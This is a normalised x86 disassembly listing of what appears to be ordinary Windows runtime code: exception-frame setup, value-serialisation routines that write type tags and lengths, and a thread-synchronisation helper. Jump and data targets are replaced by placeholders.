mov ebx eax
jmp r-xdata
push ebp
call sub_422610
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_4221f0
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_4224bc
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_417688
test [ eax + 0x24 ] 0x4
je r-xdata
sub_422810
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_422858
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_404384
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_423620
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42285f
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_422864
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_4228ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4173c8
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_42385c
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_4173d4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_423674
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_423674
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4228f1
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_4228f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_422958
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_41ae40
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_421f24
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_421e60
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42295f
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_422964
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4229fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_422810
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4041b8
xor eax eax
push ebp
push sub_4229dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_404120
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_42178c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4229e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_404174
retn
sub_422a08
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_422abc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_417688
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_422810
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_4228f8
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ac3
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42173c
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_4173d4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421e60
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_422864
pop ecx
jmp r-xdata
jmp r-xdata
sub_422ac8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_417e80
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_422810
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421dd0
mov esp ebp
pop ebp
retn
sub_422b08
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41829c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_422810
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421f98
pop ecx
pop ecx
pop ebp
retn
sub_422b44
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_422b99
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_417cc4
mov eax [ ebp + 0x8 ]
push eax
call sub_422810
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4237a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ba0
lea eax [ ebp - 0x4 ]
call sub_40482c
retn
sub_422bbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_422cab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404174
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404174
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422cb2
lea eax [ ebp - 0x4 ]
call sub_404120
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_404120
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_40442c
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_422ba4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4044a0
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_422bbc
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4044a0
jmp r-xdata
sub_422ce4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_422ed8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_417688
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_422810
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_42385c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422edf
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404144
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4041b8
xor eax eax
push ebp
push sub_422e59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_404384
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_4044a0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_422044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_404174
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_417688
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_422bbc
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_422810
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_421e60
jmp r-xdata
sub_422ef0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_422fad
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_418300
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405b50
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d7b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_422810
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_42385c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422fb4
lea eax [ ebp - 0xc ]
call sub_404120
lea eax [ ebp - 0x8 ]
call sub_405b50
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_422bbc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_422810
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_421e60
sub_422fcc
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_423067
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_418224
mov eax [ ebp + 0x8 ]
push eax
call sub_422810
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_403664
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_404384
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421e60
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_42385c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42306e
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_423074
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_4230cd
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4181a4
mov eax [ ebp + 0x8 ]
push eax
call sub_422810
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_423224
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4230d4
lea eax [ ebp - 0x10 ]
call sub_40f638
retn
sub_4230d8
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_423870
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4226a8
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_42210c
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_417688
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_423196 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_417688
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_422a08
pop ecx
jmp r-xdata
push ebp
call sub_422ac8
pop ecx
jmp r-xdata
push ebp
call sub_422b44
pop ecx
jmp r-xdata
push ebp
call sub_422ce4
pop ecx
jmp r-xdata
push ebp
call sub_422fcc
pop ecx
jmp r-xdata
push ebp
call sub_423074
pop ecx
jmp r-xdata
push ebp
call sub_422b08
pop ecx
jmp r-xdata
push ebp
call sub_422ef0
pop ecx
sub_423224
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423600
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_414f88
test al al
je r-xdata
mov eax ebx
call sub_414bac
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_411ba4
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_421e3c
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_410254
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_421f24
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_4132dc
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_4237a8
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423607
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x34 ]
call sub_405b50
lea eax [ ebp - 0x30 ]
call sub_404120
lea eax [ ebp - 0x2c ]
call sub_40482c
lea eax [ ebp - 0x1c ]
call sub_405b50
retn
xor eax eax
push ebp
push sub_4235a4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_41670c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_4232a2 ]
mov eax ebx
call sub_410d18
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_421f98
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_41165c
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_412bb4
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_423754
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_405b50
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_4138b4
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40d7b0
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_42385c
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42385c
jmp r-xdata
mov eax ebx
call sub_411ba4
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_421df4
jmp r-xdata
mov eax ebx
call sub_411ba4
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_421dd0
jmp r-xdata
mov eax ebx
call sub_412500
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_421e18
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_412bb4
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_423754
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_42385c
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_42385c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_423593
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e608
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_423539
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4032e0
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_404384
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_423754
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_42163c
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_42163c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423540
mov eax [ ebp - 0x14 ]
call sub_403390
retn
sub_423540
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_42385c
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_42163c
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42163c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403390
mov eax [ ebp - 0xc ]
call sub_403390
retn
sub_423620
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_423666
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_40442c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_423674
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42366d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_423674
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4043e0
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_42163c
mov eax esi
call sub_4045e0
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_42163c
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_4236bc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_40452c
je r-xdata
mov eax esi
call sub_4043e0
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4043e0
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_42385c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_42163c
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_42163c
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_42385c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_42163c
mov dl 0x6
mov eax ebx
call sub_42385c
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_42163c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_42163c
sub_423754
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_423799
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405fe0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4236bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4237a0
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_4237a8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42384e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405e90
mov eax [ ebp - 0x8 ]
call sub_4043e0
mov edi eax
mov eax ebx
call sub_404998
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_42385c
mov eax ebx
call sub_404998
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_42163c
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_42163c
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4043a8
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4236bc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423855
lea eax [ ebp - 0xc ]
call sub_404120
lea eax [ ebp - 0x8 ]
call sub_404120
retn
sub_423870
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_423908
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
call sub_4238e0
mov eax ebx
call sub_4238ec
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_423a96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_423a77
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a7e
mov eax [ ebp - 0xc ]
call sub_403390
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41b654
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41b544
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_423a41
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_423a12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_423aa8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_423c60
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_423af4
push ebx
push esi
push ecx
call sub_40375c
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_423d48
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_423cf0
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_41bc24
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_423cb8
mov esi [ ebx + 0x14 ]
